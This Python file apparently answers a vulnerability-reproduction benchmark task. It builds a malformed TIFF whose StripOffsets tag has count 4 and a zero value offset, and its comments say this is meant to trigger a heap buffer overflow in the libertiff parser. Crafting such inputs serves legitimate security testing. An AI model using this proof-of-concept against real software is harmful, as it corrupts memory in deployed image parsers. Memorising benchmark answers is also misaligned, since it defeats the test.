import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal TIFF file with an offline tag having a value offset of zero.
        # This aims to trigger the heap buffer overflow in third_party/libertiff.
        def pack_entry(tag, typ, count, value):
            if typ == 3 and count == 1:
                # SHORT, inline
                val_field = struct.pack('<H', value) + b'\x00\x00'
            elif count == 1:
                # LONG (or others) inline
                val_field = struct.pack('<I', value)
            else:
                # Offline (value is an offset)
                val_field = struct.pack('<I', value)
            return struct.pack('<HHI', tag, typ, count) + val_field

        parts = []
        # Header: 'II' (little-endian), magic 42, IFD offset at 8
        parts.append(b'II')
        parts.append(struct.pack('<H', 42))
        parts.append(struct.pack('<I', 8))

        entries = []
        # Minimal valid tags
        entries.append(pack_entry(256, 4, 1, 1))  # ImageWidth LONG=1
        entries.append(pack_entry(257, 4, 1, 1))  # ImageLength LONG=1
        entries.append(pack_entry(258, 3, 1, 8))  # BitsPerSample SHORT=8
        entries.append(pack_entry(259, 3, 1, 1))  # Compression SHORT=1 (no compression)
        entries.append(pack_entry(262, 3, 1, 1))  # PhotometricInterpretation SHORT=1

        # Vulnerability trigger: offline tag with value offset of zero
        # StripOffsets: LONG, count > expected number of strips (nstrips=1), value offset = 0
        entries.append(pack_entry(273, 4, 4, 0))  # StripOffsets, count=4, offset=0

        entries.append(pack_entry(278, 4, 1, 1))  # RowsPerStrip LONG=1
        entries.append(pack_entry(279, 4, 1, 1))  # StripByteCounts LONG=1

        parts.append(struct.pack('<H', len(entries)))
        parts.extend(entries)
        parts.append(struct.pack('<I', 0))  # next IFD offset = 0

        return b''.join(parts)